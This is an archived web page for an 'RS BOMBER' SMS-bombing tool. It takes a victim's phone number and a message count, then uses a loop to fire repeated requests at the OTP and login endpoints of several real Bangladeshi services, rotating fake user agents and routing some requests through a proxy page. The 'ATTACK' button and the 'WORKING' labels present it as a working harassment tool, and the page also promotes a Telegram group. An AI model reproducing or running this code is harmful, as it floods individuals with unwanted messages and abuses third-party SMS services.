

<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from x-bomber.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 25 Aug 2024 08:59:58 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RSBD CYBER ZONE</title>
    <style>
        body {
            font-family: "Courier New", Courier, monospace;
            background-color: #000;
            color: #00FF00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #111;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 20px #00FF00;
            width: 300px;
            text-align: center;
        }
        input[type="text"], input[type="number"], select {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #00FF00;
            background-color: #222;
            color: #00FF00;
            border-radius: 5px;
            font-family: "Courier New", Courier, monospace;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #00FF00;
            color: #000;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-family: "Courier New", Courier, monospace;
            margin-top: 10px;
        }
        button:hover {
            background-color: #00cc00;
        }
        #responseMessage {
            margin-top: 20px;
            font-weight: bold;
            text-align: center;
            white-space: pre-line; /* Keeps line breaks */
        }
        .developer-name {
            margin-top: 30px;
            font-size: 16px;
            font-weight: bold;
            color: #FF00FF; /* Start with a bright color */
            animation: colorchange 3s infinite;
        }
        @keyframes colorchange {
            0% { color: #FF00FF; }
            25% { color: #00FFFF; }
            50% { color: #00FF00; }
            75% { color: #FFFF00; }
            100% { color: #FF00FF; }
        }
    </style>
</head>
<body>

<div class="container">
    <h2>RS BOMBER</h2>
    <form id="smsForm">
        <label for="phone">Phone Number:</label>
        <input type="text" id="phone" name="phone" placeholder="Enter phone number" required>

        <label for="amount">SMS Amount:</label>
        <input type="number" id="amount" name="amount" placeholder="Enter SMS amount" required>

        <label for="apiSelect">Select API:</label>
        <select id="apiSelect" name="apiSelect">
            <option value="shikho">Shikho (WORKING)</option>
            <option value="bikroy">Bikroy (WORKING)</option>
            <option value="eonbazar">Eonbazar (NOT WORKING)</option>
            <option value="quizgiri">Quizgiri (WORKING)</option>
            <option value="banglalink">Banglalink (WORKING ONLY BL)</option> <!-- Added Banglalink -->
        </select>

        <button type="submit">ATTACK</button>
    </form>
    <p id="responseMessage"></p>
    
    <div class="developer-name">Developed by MR UNKNOWN</div> <!-- Added Developer Name -->


<center><script type='text/javascript'>(function() {var script=document.createElement('script');script.type='text/javascript';script.async =true;script.src='//telegram.im/widget-button/index.php?id=@team_rsbd_pro';document.getElementsByTagName('head')[0].appendChild(script);})();</script><a href='https://t.me/team_rsbd_pro' target='_blank' class='telegramim_button telegramim_shadow telegramim_pulse' style='font-size:15px;max-width:300px;height:35px;background:red;box-shadow:3px 3px 3px red;color:white;border-radius:10px;' title='Join Now'><i>Telegram </i> <small><span class='telegramim_count' data-for='@team_rsbd_pro'></span></small></a></center>
</div>

<script>
    document.getElementById('smsForm').addEventListener('submit', function(event) {
        event.preventDefault();
        
        const phone = document.getElementById('phone').value;
        const amount = parseInt(document.getElementById('amount').value, 10);
        const apiType = document.getElementById('apiSelect').value;

        document.getElementById('responseMessage').innerText = ""; // Clear previous messages

        let sentCount = 0;
        for(let i = 0; i < amount; i++) {
            sendSMS(phone, apiType).then(() => {
                sentCount++;
                if (sentCount === amount) {
                    document.getElementById('responseMessage').innerText = `${amount} SMS Sent Successfully!`;
                }
            });
        }
    });

    function sendSMS(phone, apiType) {
        const fakeUserAgents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        ];

        const randomUserAgent = fakeUserAgents[Math.floor(Math.random() * fakeUserAgents.length)];

        let url;
        let method = 'POST';
        let headers = {
            'Content-Type': 'application/json',
            'User-Agent': randomUserAgent
        };
        let body;

        if (apiType === 'shikho') {
            url = '../external.html?link=https://api.shikho.com/auth/v2/send/sms';
            body = JSON.stringify({
                auth_type: "login",
                phone: phone,
                vendor: "shikho",
                type: "student"
            });
        } else if (apiType === 'bikroy') {
            url = `https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phone}`;
            method = 'GET';
            body = null; // GET request doesn't need a body
            headers = {
                'User-Agent': randomUserAgent
            };
        } else if (apiType === 'eonbazar') {
            url = '../external.html?link=https://app.eonbazar.com/api/auth/login';
            body = JSON.stringify({
                method: "otp",
                mobile: phone
            });
        } else if (apiType === 'quizgiri') {
            url = '../external.html?link=https://developer.quizgiri.xyz/api/v2.0/send-otp';
            body = JSON.stringify({
                country_code: "+880",
                phone: phone
            });
        } else if (apiType === 'banglalink') {  // Added Banglalink API
            url = '../external.html?link=https://eshop-api.banglalink.net/api/v1/customer/send-otp';
            body = JSON.stringify({
                type: "phone",
                phone: phone
            });
        }

        return fetch(url, {
            method: method,
            headers: headers,
            body: body
        })
        .then(response => response.json())
        .catch((error) => {
            console.error('Error:', error);
            // Handle error if needed
        });
    }
</script>

</body>

<!-- Mirrored from x-bomber.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2017], Sun, 25 Aug 2024 08:59:58 GMT -->
</html>


